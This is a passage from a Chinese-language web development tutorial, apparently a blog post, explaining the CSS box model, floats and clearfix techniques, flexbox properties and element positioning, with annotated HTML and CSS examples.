class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">200px</span>; <span class="comment">/*盒子宽度*/</span></span><br><span class="line"><span class="attribute">height</span>: <span class="number">200px</span>; <span class="comment">/*盒子高度*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*内边距：padding、padding-方位名词*/</span></span><br><span class="line"><span class="attribute">padding</span>: <span class="number">20px</span>; <span class="comment">/*padding有多值写法，见下方*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*外边距：margin，与padding写法一致*/</span></span><br><span class="line"><span class="attribute">margin</span>: <span class="number">50px</span> auto; <span class="comment">/*盒子外边距，左右值为auto表示版心居中*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*边框线：border、border-方位名词*/</span></span><br><span class="line"><span class="attribute">border</span>: <span class="number">5px</span> solid brown; <span class="comment">/*粗细 样式（solid实线、dashed虚线、dotted点线） 颜色*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="padding多值写法"><a href="#padding多值写法" class="headerlink" title="padding多值写法"></a>padding多值写法</h2><table><thead><tr><th>取值个数</th><th>示例</th><th>含义</th></tr></thead><tbody><tr><td>一个值</td><td>padding: 10px;</td><td>四个方向内边距均为10px</td></tr><tr><td>四个值</td><td>padding: 10px 20px 40px 80px;</td><td>上：10px；右：20px；下：40px；左：80px；</td></tr><tr><td>三个值</td><td>padding: 10px 40px 80px;</td><td>上：10px；左右：40px；下：80px；</td></tr><tr><td>两个值</td><td>padding: 10px 80px;</td><td>上下：10px；左右：80px；</td></tr></tbody></table><p>总结：从上开始顺时针赋值，当前方向没有数值则与对面相同。</p><h2 id="使用技巧"><a href="#使用技巧" class="headerlink" title="使用技巧"></a>使用技巧</h2><p><strong>清除默认样式：</strong></p><p>有时候不需要浏览器默认样式的时候，可以统一清除，例如默认的内外边距。</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240119212704.png" alt="image.png"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*清除默认内外边距*/</span></span><br><span class="line">* &#123;</span><br><span class="line"><span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*清除列表项目符号*/</span></span><br><span class="line"><span class="selector-tag">li</span> &#123;</span><br><span class="line"><span class="attribute">list-style</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>盒子模型-元素溢出：</strong></p><p>作用：控制溢出元素的内容显示方式<br>属性名：<code>overflow</code></p><table><thead><tr><th>属性值</th><th>效果</th></tr></thead><tbody><tr><td>hidden</td><td>溢出隐藏</td></tr><tr><td>scroll</td><td>溢出滚动（无论是否溢出，都显示滚动条位置）</td></tr><tr><td>auto</td><td>溢出滚动（溢出才显示滚动条位置）</td></tr></tbody></table><p><strong>外边距问题-合并现象：</strong></p><p>垂直排列的两个元素，上下<code>margin</code>会合并，并取较大值</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240119213538.png" alt="image.png"></p><p><strong>外边距问题-塌陷问题：</strong></p><p>父子级的标签，子级的添加上外边距会产生塌陷问题，导致父级一起向下移动</p><p>解决方法：</p><ul><li>取消子级<code>margin</code>，父级设置<code>padding</code>；</li><li>父级设置<code>overflow: hidden</code>；</li><li>父级设置<code>border-top</code>；</li></ul><p><strong>行内元素-内外边距问题：</strong></p><p>行内元素添加<code>margin</code>和<code>padding</code>，无法改变元素垂直位置</p><p>解决办法：给行内元素添加<code>line-height</code>可以改变垂直位置</p><p><strong>盒子模型-圆角：</strong></p><p>作用：设置元素的外边框为圆角<br>属性名：<code>border-radius</code><br>属性值：数字px &#x2F; 百分比 （为圆角半径）</p><table><thead><tr><th>取值个数</th><th>示例</th><th>含义</th></tr></thead><tbody><tr><td>一个值</td><td>border-radius: 10px;</td><td>四个角均为10px</td></tr><tr><td>四个值</td><td>border-radius: 10px 20px 40px 80px;</td><td>左上：10px；右上：20px；右下：40px；左下：80px；</td></tr><tr><td>三个值</td><td>border-radius: 10px 40px 80px;</td><td>左上：10px；右上+左下：40px；右下：80px；</td></tr><tr><td>两个值</td><td>border-radius: 10px 80px;</td><td>左上+右下：10px；右上+左下：80px；</td></tr></tbody></table><p>总结：从左上角开始顺时针，没有就与对角相同</p><p>常见形状：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line"><span class="comment">/*正圆*/</span></span><br><span class="line"><span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">100px</span>;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="comment">/*胶囊型*/</span></span><br><span class="line"><span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">80px</span>;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">40px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>盒子模型-阴影：</strong></p><p>作用：给元素设置阴影效果<br>属性名：<code>box-shadow</code><br>属性值：x轴偏移 y轴偏移 模糊半径 扩散半径 颜色 内外阴影</p><ul><li>xy轴偏移必须写</li><li>默认是外阴影，内阴影需要添加<code>inset</code></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">80px</span>;</span><br><span class="line"><span class="attribute">box-shadow</span>: <span class="number">2px</span> <span class="number">5px</span> <span class="number">10px</span> <span class="number">0</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>) inset;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="浮动"><a href="#浮动" class="headerlink" title="浮动"></a>浮动</h1><p>作用：让块元素水平排列。<br>属性名：<code>float</code><br>属性值：</p><ul><li><strong>left</strong>：左对齐</li><li><strong>right</strong>：右对齐</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="comment">/* 特点：顶对齐；具备行内块显示模式特点；浮动的盒子会脱标 */</span></span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.one</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background-color</span>: brown;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.two</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background-color</span>: orange;</span></span><br><span class="line"><span class="language-css">    <span class="comment">/* float: left; */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">float</span>: right;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;one&quot;</span>&gt;</span>one<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;two&quot;</span>&gt;</span>two<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>特点：</p><ul><li>浮动后的盒子<strong>顶对齐</strong></li><li>浮动后的盒子具备<strong>行内块</strong>特点</li><li>浮动后的盒子<strong>脱标</strong>，<strong>不占用标准流的位置</strong></li></ul><h2 id="使用技巧-1"><a href="#使用技巧-1" class="headerlink" title="使用技巧"></a>使用技巧</h2><p><strong>产品区域布局：</strong></p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1680335016853.png" alt="1680335016853.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 版心：左右，右面：8个产品 → 8个 li --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;product&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;left&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;right&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  * &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">li</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">list-style</span>: none;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.product</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin</span>: <span class="number">50px</span> auto;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">1226px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">628px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background-color</span>: pink;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.left</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">234px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">628px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background-color</span>: skyblue;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.right</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">float</span>: right;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">978px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">628px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background-color</span>: brown;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.right</span> <span class="selector-tag">li</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin-right</span>: <span class="number">14px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin-bottom</span>: <span class="number">14px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">234px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background-color</span>: orange;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="comment">/* 第四个li和第八个li 去掉右侧的margin */</span></span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.right</span> <span class="selector-tag">li</span><span class="selector-pseudo">:nth-child</span>(<span class="number">4</span>n) &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin-right</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="comment">/* 细节：如果父级宽度不够，浮动的盒子会掉下来 */</span></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>清除浮动：</strong></p><p>浮动元素会脱标，如果<strong>父级没有高度</strong>，<strong>子级无法撑开父级高度</strong>（可能导致页面布局错乱），需要清除浮动</p><p>方法：</p><ol><li>在父级元素内容最后添加一个块级元素，设置css属性<code>clear: both</code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;clearfix&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li>单伪元素法<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>双伪元素法（推荐）<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* before 解决外边距塌陷问题 */</span></span><br><span class="line"><span class="comment">/* 双伪元素法 */</span></span><br><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">::before</span>,</span><br><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="attribute">display</span>: table;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* after 清除浮动 */</span></span><br><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>overflow<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.father</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">10px</span> auto;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">1200px</span>;</span><br><span class="line">  <span class="comment">/* height: 300px; */</span></span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line"></span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h1 id="Flex布局"><a href="#Flex布局" class="headerlink" title="Flex布局"></a>Flex布局</h1><p>设置方式：给<strong>父</strong>元素设置 <code>display: flex</code>，子元素可以自动挤压或拉伸</p><p>组成部分：</p><ul><li>弹性容器</li><li>弹性盒子</li><li>主轴：默认在<strong>水平</strong>方向</li><li>侧轴 &#x2F; 交叉轴：默认在<strong>垂直</strong>方向</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1680335870554.png" alt="1680335870554.png"></p><h2 id="Flex属性"><a href="#Flex属性" class="headerlink" title="Flex属性"></a>Flex属性</h2><h3 id="主轴对齐方式"><a href="#主轴对齐方式" class="headerlink" title="主轴对齐方式"></a>主轴对齐方式</h3><p>属性名：<code>justify-content</code></p><table><thead><tr><th>属性名</th><th>效果</th></tr></thead><tbody><tr><td>flex-start</td><td>默认值，弹性盒子从起点开始依次排列</td></tr><tr><td>flex-end</td><td>弹性盒子从终点开始依次排列</td></tr><tr><td>center</td><td>弹性盒子沿主轴居中排列</td></tr><tr><td>space-between</td><td>弹性盒子沿主轴均匀排列，空白间距均分在弹性盒子之间</td></tr><tr><td>space-around</td><td>弹性盒子沿主轴均匀排列，空白间距均分在弹性盒子两侧</td></tr><tr><td>space-evenly</td><td>弹性盒子沿主轴均匀排列，弹性盒子与容器之间间距相等</td></tr></tbody></table><h3 id="侧轴对齐方式"><a href="#侧轴对齐方式" class="headerlink" title="侧轴对齐方式"></a>侧轴对齐方式</h3><p>属性名：</p><ul><li><code>align-items</code>：当前弹性容器内所有弹性盒子的侧轴对齐方式（给弹性容器设置）</li><li><code>align-selt</code>：单独控制某个弹性盒子的侧轴对齐方式（给弹性盒子设置）</li></ul><table><thead><tr><th>属性值</th><th>效果</th></tr></thead><tbody><tr><td>stretch</td><td>弹性盒子沿着侧轴线被拉伸至铺满容器</td></tr><tr><td>center</td><td>弹性盒子沿着侧轴居中排列</td></tr><tr><td>flex-start</td><td>弹性盒子从起点开始依次排列</td></tr><tr><td>flex-end</td><td>弹性盒子从终点开始依次排列</td></tr></tbody></table><h3 id="修改主轴方向"><a href="#修改主轴方向" class="headerlink" title="修改主轴方向"></a>修改主轴方向</h3><p><strong>主轴默认在水平方向，侧轴默认在垂直方向</strong></p><p>属性名：<code>flex-direction</code></p><table><thead><tr><th>属性值</th><th>效果</th></tr></thead><tbody><tr><td>row</td><td>水平方向，从左往右（默认）</td></tr><tr><td>column</td><td>垂直方向，从上到下</td></tr><tr><td>row-reverse</td><td>水平方向，从右往左</td></tr><tr><td>column-reverse</td><td>垂直方向，从下到上</td></tr></tbody></table><h3 id="弹性伸缩比"><a href="#弹性伸缩比" class="headerlink" title="弹性伸缩比"></a>弹性伸缩比</h3><p>作用：控制弹性盒子的主轴方向的尺寸。<br>属性名：<code>flex</code><br>属性值：整数数字，表示占用<strong>父级剩余尺寸的份数</strong>。</p><h3 id="弹性盒子换行"><a href="#弹性盒子换行" class="headerlink" title="弹性盒子换行"></a>弹性盒子换行</h3><p>弹性盒子可以自动挤压或拉伸，默认情况下，所有弹性盒子都在一行显示。<br>属性名：<code>flex-wrap</code><br>属性值：</p><ul><li><code>wrap</code>：换行</li><li><code>nowrap</code>：不换行（默认）</li></ul><h3 id="行对齐方式"><a href="#行对齐方式" class="headerlink" title="行对齐方式"></a>行对齐方式</h3><p>属性名：<code>align-content</code></p><table><thead><tr><th>属性名</th><th>效果</th></tr></thead><tbody><tr><td>flex-start</td><td>默认值，弹性盒子从起点开始依次排列</td></tr><tr><td>flex-end</td><td>弹性盒子从终点开始依次排列</td></tr><tr><td>center</td><td>弹性盒子沿主轴居中排列</td></tr><tr><td>space-between</td><td>弹性盒子沿主轴均匀排列，空白间距均分在弹性盒子之间</td></tr><tr><td>space-around</td><td>弹性盒子沿主轴均匀排列，空白间距均分在弹性盒子两侧</td></tr><tr><td>space-evenly</td><td>弹性盒子沿主轴均匀排列，弹性盒子与容器之间间距相等</td></tr></tbody></table><ul><li>对单行弹性盒子模型<strong>无效</strong></li></ul><h1 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h1><p>作用：灵活的改变盒子在网页中的位置<br>实现：</p><ol><li>定位模式：<code>position</code></li><li>边偏移：设置盒子的位置</li></ol><ul><li><code>left</code></li><li><code>right</code></li><li><code>top</code></li><li><code>bottom</code></li></ul><h2 id="相对定位"><a href="#相对定位" class="headerlink" title="相对定位"></a>相对定位</h2><p><code>position: relative</code></p><p>特点：</p><ul><li>不脱标，占用自己原来位置</li><li>显示模式特点保持不变</li><li>设置边偏移则相对自己原来位置移动</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="绝对定位"><a href="#绝对定位" class="headerlink" title="绝对定位"></a>绝对定位</h2><p><code>position: absolute</code></p><p>使用场景：子级绝对定位，父级相对定位（<strong>子绝父相</strong>）<br>特点：</p><ul><li>脱标，不占位</li><li>显示模式具备行内块特点</li><li>设置边偏移则相对最近的已经定位的祖先元素改变位置</li><li>如果祖先元素都未定位，则相对浏览器可视区改变位置</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.father</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.father</span> <span class="selector-tag">span</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="定位居中"><a href="#定位居中" class="headerlink" title="定位居中"></a>定位居中</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1680340142857.png" alt="1680340142857.png"></p><p>实现步骤：</p><ol><li>绝对定位</li><li>水平、垂直边偏移为 50%</li><li>子级向左、上移动自身尺寸的一半</li></ol><ul><li>左、上的外边距为 –尺寸的一半</li><li><code>transform: translate(-50%, -50%)</code></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">img</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* margin-left: -265px;</span></span><br><span class="line"><span class="comment">  margin-top: -127px; */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 方便： 50% 就是自己宽高的一半 */</span></span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, -<span class="number">50%</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="固定定位"><a href="#固定定位" class="headerlink" title="固定定位"></a>固定定位</h2><p><code>position: fixed</code></p><p>场景：元素的位置在网页滚动时不会改变<br>特点：</p><ul><li>脱标，不占位</li><li>显示模式具备行内块特点</li><li>设置边偏移相对浏览器窗口改变位置</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="堆叠层级z-index"><a href="#堆叠层级z-index" class="headerlink" title="堆叠层级z-index"></a>堆叠层级z-index</h2><p>默认效果：按照标签书写顺序，后来者居上<br>作用：设置定位元素的层级顺序，改变定位元素的显示顺序<br>属性名：<code>z-index</code><br>属性值：<strong>整数数字</strong>（默认值为0，取值越大，层级越高）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box1</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line">  <span class="comment">/* 取值是整数，默认是0，取值越大显示顺序越靠上 */</span></span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box2</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: skyblue;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">100px</span>;</span><br><span class="line"></span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用技巧-2"><a href="#使用技巧-2" class="headerlink" title="使用技巧"></a>使用技巧</h2><p><strong>CSS精灵：</strong><br>CSS 精灵，也叫 <strong>CSS 